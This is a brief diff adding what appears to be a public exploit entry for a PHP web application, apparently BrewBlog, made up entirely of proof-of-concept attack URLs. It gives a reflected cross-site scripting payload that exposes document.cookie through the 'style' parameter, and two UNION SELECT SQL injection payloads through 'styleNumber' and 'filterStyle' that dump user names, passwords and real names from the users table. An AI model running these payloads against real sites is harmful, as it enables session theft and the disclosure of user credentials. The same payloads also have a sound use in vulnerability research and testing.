@@ -1,0 +1,9 @@
+Cross-site scripting:
+
+http://www.example.com/index.php?page=brewBlogList&amp;style=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p+&quot;
+ 
+SQL-injection:
+ 
+http://www.example.com/sections/reference.inc.php?source=log&amp;section=styles&amp;styleNumber=null union select null,null,null,null,null,null,null,null,null,null,null,null,null,null,concat(user_name,0x3a,password),null,concat(realFirstName,0x20,realLastName) FROM users--
+ 
+http://www.example.com/sections/reference.inc.php?source=log&amp;section=styles&amp;filterStyle=null union select null,null,null,null,null,null,null,null,null,null,null,null,null,null,concat(user_name,0x3a,password),null,concat(realFirstName,0x20,realLastName) FROM users--
